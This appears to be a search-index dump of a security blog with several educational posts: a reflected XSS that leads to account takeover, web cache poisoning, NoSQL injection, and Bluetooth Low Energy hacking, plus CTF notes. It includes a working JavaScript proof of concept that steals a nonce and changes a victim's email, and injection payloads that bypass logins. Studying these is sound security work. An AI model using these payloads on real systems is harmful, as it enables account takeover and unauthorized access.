Interestingly, when trying to change it, there was no security mechanism verifying that the change was actually initiated by the user of that account. Normally, there’s an extra step where the user must input their password or any other identification method.\nSo, the first thing that came to mind was trying to carry out a CSRF attack, where I force the user to change their email to mine. This would allow me to use the regular “forgot password” function from the website, then input the email address that was set in the victim’s account, receive the reset email, and change the password to a desired one. However, I quickly realized that WordPress securely handled CSRF tokens in this application, so I wasn’t able to take that route yet. The next idea was to find an XSS vulnerability, which would allow me to just read those tokens out of the HTML and submit the form with those automatically.\nFinding XSS #\rLuckily, during my research, I came across a simple reflected XSS in the application: https://example.com/login/confirm_mail.php?email=\u0026lt;img/src/onerror=print()\u0026gt;\nCreating the Exploit Script #\rThe next step was to create the script that would automatically change the email address in the user’s settings. However, we first have to get the nonce that Wordpress added to each form request.\nPoC #\rfetch(\u0026#39;https://example.com/edit-account/\u0026#39;).then(response =\u0026gt; response.text()).then(html =\u0026gt; { // Fetch the nonce from vulnerable endpoint var parser = new DOMParser(); var doc = parser.parseFromString(html, \u0026#39;text/html\u0026#39;); var nonce = doc.getElementById(\u0026#39;save-account-details-nonce\u0026#39;).value; console.log(nonce); // Change email fetch(\u0026#39;https://example.com/edit-account/\u0026#39;, { method: \u0026#39;POST\u0026#39;, // Include Cookies credentials: \u0026#39;include\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, body: `first_name=Test \u0026amp;last_name=Test \u0026amp;display_name=Test \u0026amp;email=\u0026lt;email we controll\u0026gt; \u0026amp;password_current= \u0026amp;password_1= \u0026amp;password_2= \u0026amp;save-account-details-nonce=${nonce}` }) .then(response =\u0026gt; { if (response.ok) { console.log(\u0026#34;Done!\u0026#34;); } else { console.log(\u0026#34;Something went wrong..\u0026#34;); } }); }); The password parameters can be left empty, since the application only uses those, when a user wants to change their password via the UI on the website:\npassword_current= password_1= password_2= Explanation: We first send a request to the vulnerable endpoint to retrieve the nonce: https://example.com/edit-account/. The response is parsed, and the nonce is extracted from the HTML doc.getElementById('save-account-details-nonce').value. After that, we send a second request to the endpoint where we then fill out the forms details. This request includes the nonce and the attacker’s desired email address. The credentials parameter ensures cookies are included, maintaining the session context.\nWith this script in hand we can include it via our reflected XSS https://example.com/login/confirm_mail.php?email={ATTACKER-SCRIPT} and send it to a victim. After the script automatically updates the email address of the victim, we can use the already described way via the password reset function. Thus, the account is fully compromised where the victim isn\u0026rsquo;t even able to recover the account, since not only the password but also the email address changed.\n","date":"19 February 2025","externalUrl":null,"permalink":"/posts/reflected-xss-to-ato/","section":"Posts","summary":"The Vulnerabillity #\rWhen researching an application, I noticed that there was a feature for resetting the email address of our user.","title":"Reflected XSS to Account Takeover","type":"posts"},{"content":" Introduction During a recent penetration test of a web application, we discovered a Cross-Site Scripting (XSS) via caching vunlerabillity. This article explores the discovery, and exploitation of this issue to help developers and security professionals better understand and protect against similar vulnerabilities. Terminology Keyed Parameters Keyed parameters are parameters that the cache system considers when storing and retrieving cached content. This means that variations in these parameters will result in different cached entries. For example, if the URL has parameters such as ?user=123 and the cache is keyed on this parameter, the cache will store and serve different content (cache miss) for ?user=123 and ?user=456. Unkeyed Parameters Unkeyed parameters are parameters that the cache system ignores when storing and retrieving cached content. This means that variations in these parameters will not result in different cached entries. The cache will store only one version of the content (cache hit), regardless of the variations in these parameters. Step 1: Identifying Unkeyed Parameters The first step is to identify unkeyed parameters, since keyed parameters need to be the same when the victim accesses the resource. Example http GET /page?user=admin\u0026amp;tracking=abc HTTP/1.1 Host: example.com http HTTP/1.1 200 OK Content-Type: text/html Content-Length: 456 X-Cache: MISS # \u0026lt;-- Note that we get a cache MISS here \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, admin!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Now we alter each parameter and check weather we get a cache miss or hit. A cache MISS indicates us that this parameter is keyed, since the server loaded a new version of the website. http GET /page?user=guest\u0026amp;tracking=abc HTTP/1.1 Host: example.com http HTTP/1.1 200 OK Content-Type: text/html Content-Length: 456 X-Cache: MISS # \u0026lt;-- Note we get a cache MISS here again (keyed parameter) \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, guest!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Now that we identified the user parameter to be keyed, let’s continue and check the tracking parameter. http GET /page?user=admin\u0026amp;tracking=abc HTTP/1.1 Host: example.com http Content-Type: text/html Content-Length: 456 X-Cache: HIT # \u0026lt;-- Note that we get a cache HIT here, since we already made that requests before \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, admin!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; http GET /page?user=admin\u0026amp;tracking=efg HTTP/1.1 Host: example.com http Content-Type: text/html Content-Length: 456 X-Cache: HIT # \u0026lt;-- Note that we get a cache HIT here again, indicating that this parameter is unkeyed \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, admin!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; We can observe the tracking parameter must be a unkeyed value, since the cache always returns HIT, even though the value of the parameter was changed. The same thing also sometimes applies to header values in the http requests. Step 2: Exploitation One of the most commong ways to exploit WCP is through XSS, though there are other attacks like DoS or unkeyed Cookies as well. To exploit a XSS you have to find an injection point using an unkeyed parameter. The XSS will then be severed to all other users loading that cached version. Example Imagine we have an injection via the tracking parameter into a meta tag like this http GET /page?user=admin\u0026amp;tracking=https://mytrack.com HTTP/1.1 ... \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;https://mytrack.com\u0026#34; /\u0026gt; http GET /page?user=admin\u0026amp;tracking=\u0026#34;\u0026gt;\u0026lt;img/src/onerror=print()\u0026gt; HTTP/1.1 Host: example.com http Content-Type: text/html Content-Length: 456 X-Cache: MISS # \u0026lt;-- Initial request will be a MISS, the next time we open it will be a HIT \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;https://\u0026#34;\u0026gt;\u0026lt;img/src/onerror=print()\u0026gt; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, admin!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Since tracking is an unkeyed parameter, anybody who visits the page /page?user=admin will be a victim of the XSS attack. Step 3: Advanced WCP Techniques Fat GET A “Fat GET” request, is when we use GET parameters in the post body, while still using the GET verb. If a server is misconfigured it might parse the parameters from the body. http GET /index.php?param1=Hello\u0026amp;param2=World HTTP/1.1 Host: example.com http GET /index.php?param1=Hello\u0026amp;param2=World HTTP/1.1 Host: example.com Content-Length: 10 param3=123 With this you can try to create a discrepancy between the webserver and the cache. With this we can also use keyed parameters, since they are no longer directly present in the URL. We can then go back and perform an XSS attack the same way we did before. http GET /page?user=admin\u0026amp;tracking=abc HTTP/1.1 Host: example.com user=guest http Content-Type: text/html Content-Length: 456 X-Cache: MISS \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, guest!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; http GET /page?user=admin\u0026amp;tracking=abc HTTP/1.1 Host: example.com user=\u0026lt;/p\u0026gt;\u0026lt;img/src/onerror=print()\u0026gt;\u0026lt;p\u0026gt; http Content-Type: text/html Content-Length: 456 X-Cache: MISS \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Welcome, \u0026lt;/p\u0026gt;\u0026lt;img/src/onerror=print()\u0026gt;\u0026lt;p\u0026gt;!\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Again, if a victim now opens example.com/page?user=admin the XSS will be loaded from the cache. A Real Life PoC http GET /?cb=100\u0026amp;\u0026#34;\u0026gt;\u0026lt;image/src/onerror=print()\u0026gt; HTTP/2 Host: target-website.com Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36 HTTP/2 200 OK CACHE: HIT htmlbars ... \u0026lt;meta property=\u0026#34;og:url\u0026#34; content=\u0026#34;https://target-website.com/?cb=100\u0026amp;\u0026#34;\u0026gt;\u0026lt;image/src/onerror=print()\u0026gt;\u0026#34;\u0026gt; ... In this example, an image tag with an onerror event is injected into the URL parameter. When the server processes this request, the parameter is reflected in the HTML response and cached. Consequently, subsequent users requesting the cached page will execute the malicious JavaScript.

However, with this rise in adoption comes an increase in security vulnerabilities. NoSQL injection attacks occur when untrusted user input is improperly handled and executed within a NoSQL query, allowing an attacker to manipulate database operations. These vulnerabilities are as dangerous as traditional SQL injections but are often overlooked due to the misconception that NoSQL databases are inherently secure.\nTypes of NoSQL Injection #\rNoSQL injection attacks can be categorized based on how the attacker interacts with the database and the feedback received. Understanding these types is crucial for both developers and security professionals to identify and mitigate potential threats.\nIn-Band Injection #\rIn-Band Injection involves the attacker using the same communication channel to both launch the attack and gather results. This method is straightforward because the feedback is immediate.\nExample Scenario: Consider a web application using MongoDB that accepts user login credentials via an HTTP POST request. The vulnerable PHP code might look like this:\n// Vulnerable PHP code $collection-\u0026gt;find([ \u0026#39;username\u0026#39; =\u0026gt; $_POST[\u0026#39;username\u0026#39;], \u0026#39;password\u0026#39; =\u0026gt; $_POST[\u0026#39;password\u0026#39;] ]); $collection-\u0026gt;find($query); An attacker can craft an HTTP request to exploit this unsanitized input:\nPOST /login.php HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded username=admin\u0026amp;password[$ne]=null Explanation: PHP Array Syntax \u0026ndash; When writing MongoDB queries in PHP, arrays represent MongoDB’s query structure. The syntax password[$ne]=null translates to an associative array in PHP:\n$query = [ \u0026#39;password\u0026#39; =\u0026gt; [ \u0026#39;$ne\u0026#39; =\u0026gt; null ] ]; Resulting Query:\ndb.users.findOne({ username: \u0026#34;admin\u0026#34;, password: { \u0026#34;$ne\u0026#34;: null } }); Since the password is not null, the condition is true, and the attacker gains unauthorized access as the admin.\nBlind Injection #\rBlind Injections occur when an attacker cannot see the direct results of their injected queries but can infer information based on the application’s responses, such as differences in content, HTTP status codes, error messages, or response times.\nBoolean-Based #\rIn a Boolean-Based Blind Injection, the attacker sends queries that evaluate to either true or false and observes the application’s behavior to infer information about the database.\nExample Scenario: Consider a search functionality with a NoSQL Injection vulnerability, where users can search for products. An attacker sends a request with a crafted search term:\nGET /search.php?search[$regex]=^S.* HTTP/1.1 Host: example.com If a product starting with the letter “S” exists:\nHTTP/1.1 200 OK Content-Type: text/html { Exists: true } Otherwise:\nHTTP/1.1 200 OK Content-Type: text/html No products found. To extract the full name of the product, the attacker continues testing each subsequent character to reconstruct the produc name:\nsearch[$regex]=^Se.* ✔️ search[$regex]=^Sea.* ✖️ search[$regex]=^Sec.* ✔️ … search[$regex]=^SecretProduct$ The $ indicates the end of a string, verifying if the entire word is correct.\nTime-Based #\rIn a Time-Based Blind Injection, the attacker sends queries that cause the server to delay its response when certain conditions are true. By measuring these response times, the attacker can infer information about the database.\nExample Scenario: Assume a NoSQL Injection vulnerability in the username parameter:\nPOST /login HTTP/1.1 Host: example.com Content-Type: application/json { \u0026#34;username\u0026#34;: { \u0026#34;$where\u0026#34;: \u0026#34;function() { if(this.username == \u0026#39;admin\u0026#39;) { sleep(5000); } return true; }\u0026#34; }, \u0026#34;password\u0026#34;: \u0026#34;randompassword\u0026#34; } Explanation: JavaScript Function \u0026ndash; The this keyword refers to the current document being evaluated in the collection.\nif(this.username == \u0026#39;admin\u0026#39;) { sleep(5000); } Behavior: If this.username == 'admin' evaluates to true, the function calls sleep(5000) to delay the response by 5 seconds, indicating that the username exists. Otherwise, the response time remains normal.\nAn attacker can enumerate usernames or other fields character by character using a similar method:\n{ \u0026#34;username\u0026#34;: { \u0026#34;$where\u0026#34;: \u0026#34;function() { if (this.username[0] == \u0026#39;a\u0026#39;) { sleep(5000); } return true; }\u0026#34; }, \u0026#34;password\u0026#34;: \u0026#34;irrelevant\u0026#34; } By systematically testing each character position, the attacker can reconstruct sensitive information.\nServer-Side JavaScript Injection (SSJI) #\rMongoDB allows the use of JavaScript expressions in queries via the $where operator. If not handled securely, this feature can be exploited.\nExample Scenario: Consider the following MongoDB query in a Node.js application:\ncollection.findOne({ $where: `this.username == \u0026#39;${username}\u0026#39; \u0026amp;\u0026amp; this.password == \u0026#39;${password}\u0026#39;` }, function(err, user) { if (user) { res.send(\u0026#39;Logged in as \u0026#39; + user.username); } else { res.send(\u0026#39;Authentication failed\u0026#39;); } }); An attacker can manipulate the username field to inject malicious code:\nPOST /login HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded username=admin\u0026#39; || true //\u0026amp;password=anything Resulting Query:\ndb.users.findOne({ $where: \u0026#34;this.username == \u0026#39;admin\u0026#39; || true // \u0026#39; \u0026amp;\u0026amp; this.password == \u0026#39;anything\u0026#39;\u0026#34; }); Effect: The condition this.username == 'admin' || true always evaluates to true, allowing the attacker to bypass authentication.\nFurther Exploitation: Attackers can use injections like \u0026quot; || \u0026quot;\u0026quot;==\u0026quot; or \u0026quot; || true || \u0026quot;\u0026quot;==\u0026quot; to evaluate the entire query to true. They can also enumerate fields using functions like match($regex) and the character-by-character approach mentioned earlier.\n","date":"18 February 2025","externalUrl":null,"permalink":"/posts/nosql/","section":"Posts","summary":"Overview #\rNoSQL databases like MongoDB, Couchbase, and Cassandra have gained immense popularity due to their flexibility, scalability, and performance benefits over traditional relational databases.","title":"NoSQL Injection Attacks","type":"posts"},{"content":" 🏆 318/1061 -- 700 Points Challange Type Points Finished Secure Bank Rev 100 November 16th, 11:55:09 PM BabyFlow Warmup 50 November 16th, 8:29:59 PM Rigged Slot Machine 1 Warmup 50 November 16th, 8:21:55 PM Trackdown 2 OSINT 100 November 15th, 8:09:06 PM Trackdown OSINT 100 November 15th, 7:49:05 PM Cold Storage Mobile 100 November 15th, 5:05:44 PM BioCorp Web 100 November 15th, 3:16:32 PM Pizza Paradise Web 100 November 15th, 2:46:25 PM Writeups #\rCold Storage 🐈 #\rThe Initial Roadblock: APK Installation Blues Like any eager hacker starting a mobile challenge, I dove straight in trying to install the APK.

The key difference to regular Bluetooth is that BLE is intended to consume less power while maintaining a similar communication range. This is achieved by implementing a always off technology, meaning solely short amounts of data are transmitted if and only if it is required. BLE uses the IMA (2.4 GHz) band with 40 channels, where 3 of these are used for advertising.\nCentral and Peripherals #\rAssume we just bought a super cool new Fitness tracker, which also provides an IOS or Android application for our phone. When using the tracker, for example, to measure our heart rate, it communicates directly to the app, which then displays the data. This is a typical example of BLE communication, where the data is sent from one device to another. We typicall call these devices peripheral (sending) and central (receiving). Peripherals (tracker) are mostly small, low-energy devices that can connect to more powerful central devices (phone).\nAdvertising #\rCool, but how do these devices even know about each other\u0026rsquo;s presence?\nGreat questions, I\u0026rsquo;m glad you asked! The magic word here is advertising.\nOur tracker (peripheral) constantly sends out advertising data every X ms (defined by an advertising interval), which a central device can then look out for. If the central device is ready to listen to these packets, it will respond with a scan response request.\nFor our example, the application on our phone will scan for the specific MAC address of our tracker, which was probably programmed within the application itself, and sends a response request back to the tracker when found.\nRegarding the advertising data, different things such as the device name, TX Powerlevel, ID, or services are included.\nHow BLE works #\rLet us now investigate how the BLE Protocol operates, by taking a look at the different layers it consists of. As a whole, the protocol can be broken down into the following layers and sub-protocols:\nGeneric Access Profile (GAP) #\rGAP implements the advertising process we discussed before. It is also responsible for defining devices\u0026rsquo; roles in BLE communication. As for the roles, the following once exists: Broadcaster, Observer, Peripheral, and Central. Depending on the connection type: Broadcast (one-to-many) or Unicast (one-to-one), devices will be assigned one of those. Peripheral and central for unicast, broadcaster, and observer for broadcast.\nGeneric Attribute Protocol (GATT) #\rNow, one of the other very important sub-protocols is GATT. This protocol defines how two BLE devices exchange data with each other. This data exchange is initiated after the advertising process (GAP) has been completed. Now, the core concept of data exchange lies in so-called characteristics and services.\nCharacteristics #\rIn simple words, a characteristic can be thought of as a basic \u0026ldquo;API endpoint\u0026rdquo; (e.g. GET /tracker/heart_rate). It can be accessed and called by devices to either read, write, or listen and notify for any updated data. However, in terms of BLE we often encounter that those \u0026ldquo;API endpoints\u0026rdquo; are not directly translated into something useful such as GET /tracker/heart_rate, but a UUID like AAE28F0071B534ABCF182F...\nMostly, if we see such a UUID we can assume that this is a custom-created characteristic by the manufacturer. At the beginning of a connection, a series of characteristics and the service name are exchanged by the devices. This way the central device can identify the service.\nThe interesting part about BLE is that most devices are configured to accept connections by any device without pairing or bonding first. This allows us to interact with the device and retrieve the services and characteristics. Although, those can be configured to require pairing or bonding as well, but more on that later.\nServices #\rA service is simply a bundle of different characteristics. In the example of our \u0026ldquo;API endpoint\u0026rdquo;, it could be the /tracker/ path that bundles different functionality such as /heart_rate. Commonly, bundling characteristics is done in a logical way, such as we did with the tracker and the corresponding heart rate function.\nHacking BLE #\rPrerequisites #\rHacking protocols like Bluetooth, WiFi, Zigbee, etc. mostly require external hardware to do so. For BLE my recommendation is to get an nRF52840 Dongle for the beginning. It costs around 10-20$ and features multiple protocols, already compiled programs such as a BLE sniffer, and other super useful stuff.\nEnumeration #\rLet us see if the interface we want to use even shows up on our PC by using hci tools. HCI stands for Host Controller Interface and is used between the controller and host layer of the BLE stack.\n❯ hciconfig hci1:\tType: Primary Bus: USB BD Address: 5C:F3:70:XX:XX:XX ACL MTU: 1021:8 SCO MTU: 64:1 UP RUNNING RX bytes:1414 acl:0 sco:0 events:84 errors:0 TX bytes:4689 acl:0 sco:0 commands:69 errors:0 hci0:\tType: Primary Bus: USB BD Address: D8:80:83:XX:XX:XX ACL MTU: 1021:6 SCO MTU: 240:8 UP RUNNING RX bytes:3551738 acl:1126 sco:636 events:436453 errors:2 TX bytes:363080346 acl:422502 sco:362 commands:2761 errors:0 Great, let\u0026rsquo;s do our first quick LE scan to see the devices around us:\n❯ sudo hcitool lescan LE Scan ... 38:18:4C:24:30:3E LE_WH-1000XM3 38:18:4C:XX:XX:XX (unknown) ...

Remembering the sections before, those seem to be the services.\n│ 0005 -\u0026gt; 0009 │ Generic Access (1800) │ │ │ │ 0007 │ Device Name (2a00) │ READ │ LE_WH-1000XM3 │ │ 0009 │ Appearance (2a01) │ READ │ Unknown\t│ Below each of the services, we find the individual characteristics, and their properties (READ, WRITE, NOTIFY), as well as the data which bettercap automatically reads and displays for us. Further, we can see the memory location where the data is stored, referred to as handles.\n│ 0005 -\u0026gt; 0009 │ Generic Access (1800) │ │ │ │ 0007 │ Device Name (2a00) │ READ │ LE_WH-1000XM3 │ │ 0009 │ Appearance (2a01) │ READ │ Unknown\t│ Here it is always important to check out that the memory locations are overlapping, meaning there is no gap between memory addresses, e.g. [0001 -\u0026gt; 0004] -\u0026gt; [0005 -\u0026gt; 0009].. and so on. If there were gaps between the handles, this could mean that there are hidden services inside.\nFurther, some of those handles do require some sort of pairing or bonding, indicated by the insufficient encryption.\nNow, if you take a look at the table again, you will see that there are a lot of custom-implemented services and characteristics displaying just a UUID. If we are planning to attack this device, we probably should know what the actual functionality behind each UUID is. For this, we will need to reverse engineer each of those characteristics by e.g. inspecting and experimenting with the traffic in Wireshark. However, this is a whole different topic and not in the scope of this blog article.\nReading and writing data #\rSo for reading data, we already saw that bettercap automatically reads and displays the data out of READ properties. However, we can also try to read data manually from a specific handle if we wish to do so.\n❯ sudo gatttool -b 38:18:4c:24:30:3e --char-read -a 0x0039 | awk -F: \u0026#39;{print $2}\u0026#39; | xxd -r -p;printf \u0026#39;\\n\u0026#39; WH-1000XM3 For writing data to a handle we can do something very similar. However, since we haven\u0026rsquo;t reversed the characteristics, we have to guess which type of data is expected by the device. We can however use the --listen flag, which may return some information via the NOTIFY property within the service.\n# We are trying to write a string, which is rejected ❯ sudo gatttool -b 38:18:4c:24:30:3e --char-write-req -a 0x0034 -n $(echo -n \u0026#34;test\u0026#34; | xxd -ps) --listen Characteristic Write Request failed: Attribute value length is invalid # We are trying to write a simple 0x00 byte, which is allowed ❯ sudo gatttool -b 38:18:4c:24:30:3e --char-write-req -a 0x0034 -n 00 --listen Characteristic value was written successfully Notification handle = 0x0036 value: 01 ❯ sudo gatttool -b 38:18:4c:24:30:3e --char-write-req -a 0x0034 -n 01 --listen Characteristic value was written successfully Notification handle = 0x0036 value: 00 Notify #\rMore details on this topic can be found here\nSometimes, when using --listen, we won’t receive any data from a characteristic \u0026ndash; even though it has the notify property. In these cases, we might need to configure the Client Characteristic Configuration Descriptor (CCCD) so that the server knows we want to receive notifications or indications.\nThe CCCD is a specific type of descriptor that allows a client to subscribe to updates for a characteristic that supports server-initiated operations (i.e., notifications or indications). In our fitness tracker example, the phone can use the CCCD to subscribe to the heart rate measurement characteristic and receive updates automatically, rather than having to poll for the data.\nFor our theoretical example, let’s choose the service with UUID 91c10d9c... that spans handles 0x001f to 0x002b. Assume that the CCCD for the characteristic is located at handle 0x002b (which has the required read and write permissions). We would then execute char-write-req 0x002b 0100 to enable the notifications.\nnRF Connect #\rA way easier way compared to the manual one we saw before is to utilize the power of the nRF Dongle I recommended before. The application offers a lot of different programs, also BLE, that we can directly run with just a click.\nWe get the same results by just clicking on \u0026ldquo;Start scan\u0026rdquo; and the corresponding \u0026ldquo;Connect\u0026rdquo; button. Further, we can also see that the software automatically reads out the data from READ properties if it is able to just like bettercap.\nWriting and notifying is also just as easy as clicking a button or inputting the values. Although the sotware does not automatically decoded the bytes of 57 48 2D.. to WH-1000XM3, which bettercap actually did for us.\n│ 0039 │ 5b833c146bc748028e9a723ceca4bd8f │ READ │ WH-1000XM3 │ Summary #\rIn this article, we delved into the essentials BLE and its inner workings. We began by exploring the fundamental differences between BLE and classic Bluetooth, emphasizing BLE\u0026rsquo;s low-power communication and its unique advertising mechanism. Key BLE components such as GAP and GATT were discussed, highlighting how they define device roles, advertising, and data exchange through services and characteristics.\nWe then transitioned into the practical side of BLE hacking. Using tools like bettercap and gatttool, we demonstrated how to enumerate nearby BLE devices, inspect their available services, and interact with their characteristics \u0026ndash; whether it’s reading, writing, or enabling notifications. The article also covered common challenges such as handling hidden services as well as a brief overview of how modern tools like the nRF Connect suite can simplify these tasks.\nOverall, this guide provides a solid foundation for understanding BLE technology and its vulnerabilities, paving the way for further exploration and security testing in the ever-evolving landscape of IoT and wireless communications.\n","date":"17 February 2025","externalUrl":null,"permalink":"/posts/ble/","section":"Posts","summary":"Overview #\rFeel free to skip to the hacking part directly if you don\u0026rsquo;t care about the basics of BLE","title":"Bluetooth Low Energy Hacking 101","type":"posts"},{"content":"","date":"17 February 2025","externalUrl":null,"permalink":"/ctfs/","section":"Ctfs","summary":"","title":"Ctfs","type":"ctfs"},{"content":" 🏆 123/798 -- 200 points Challange Type Points Finished Fuzzybytes web 50 November 23rd, 6:56:11 PM typstastic misc 50 November 23rd, 5:19:06 AM Rivest–Shamir–Adleman-Germain crypto 50 November 22nd, 9:04:34 PM Welcome welcome 50 November 22nd, 7:02:16 PM Learnings #\rEmbedded PNG files inside PDF stream #\rpeepdf can help to analyze PDF streams\nImHex is a nice hex editor\nWe can see image data (PNG) is compressed into xref_streams Use PyMuPDF library to extract the data\nxref_stream() automatically Locates the stream in the PDF Applies the necessary decompression Removes any encoding Returns the raw binary data xref is just a number\nIt\u0026rsquo;s the index or ID of each object in the PDF\u0026rsquo;s cross-reference table xref // Start of xref table 0 6 // Start at obj 0, contains 6 objects 0000000000 65535 f // Object 0 0000000010 00000 n // Object 1 0000000079 00000 n // Object 2 0000000173 00000 n // Object 3 0000000301 00000 n // Object 4 0000000380 00000 n // Object 5 # In PDF hex dump stream 789C636400.... # This is compressed data endstream # After xref_stream() decoding 89504E470D0A... # Actual PNG data \u0026gt;\u0026gt; endobj 20 0 obj // \u0026lt;---- OBJ ID 20 \u0026lt;\u0026lt;/Length 100\u0026gt;\u0026gt; stream �PNG // \u0026lt;-- PNG starts We can then use this script to target the specific stream where the PNG file is via id 20 and read the raw data from the xref_stream import fitz # PyMuPDF def extract_streams_with_fitz(pdf_path, start_object, output_path): # Open the PDF pdf_document = fitz.open(pdf_path) aggregated_data = b\u0026#34;\u0026#34; # Iterate through all xref objects starting from the specified one for xref in range(start_object, pdf_document.xref_length()): try: # Get the raw stream data stream_data = pdf_document.xref_stream(xref) if stream_data: aggregated_data += stream_data except Exception as e: print(f\u0026#34;Failed to process object {xref}: {e}\u0026#34;) continue with open(output_path, \u0026#34;wb\u0026#34;) as f: f.write(aggregated_data) print(f\u0026#34;Aggregated PNG data saved to {output_path}\u0026#34;) extract_streams_with_fitz(\u0026#34;chall.pdf\u0026#34;, 20, \u0026#34;chall.png\u0026#34;) ","date":"17 February 2025","externalUrl":null,"permalink":"/ctfs/glacier-2024/","section":"Ctfs","summary":"🏆 123/798 -- 200 points Challange Type Points Finished Fuzzybytes web 50 November 23rd, 6:56:11 PM typstastic misc 50 November 23rd, 5:19:06 AM Rivest–Shamir–Adleman-Germain crypto 50 November 22nd, 9:04:34 PM Welcome welcome 50 November 22nd, 7:02:16 PM Learnings #\rEmbedded PNG files inside PDF stream #\rpeepdf can help to analyze PDF streams","title":"Glacier (2024)","type":"ctfs"},{"content":"\rH1 Test #\rasdsa code\nprint(\u0026#34;test\u0026#34;) Month Savings January $250 February $80 March $420 test\nnunocoracao/blowfish\rPersonal Website \u0026amp; Blog Theme for Hugo\rHTML 1693\r459\rWhen life gives you lemons, make lemonade.\rgraph LR; A[Lemons]--\u003eB[Lemonade]; B--\u003eC[Profit] header badge test\rsubheader\rLorem ipsum dolor sit amet, consectetur adipiscing elit.
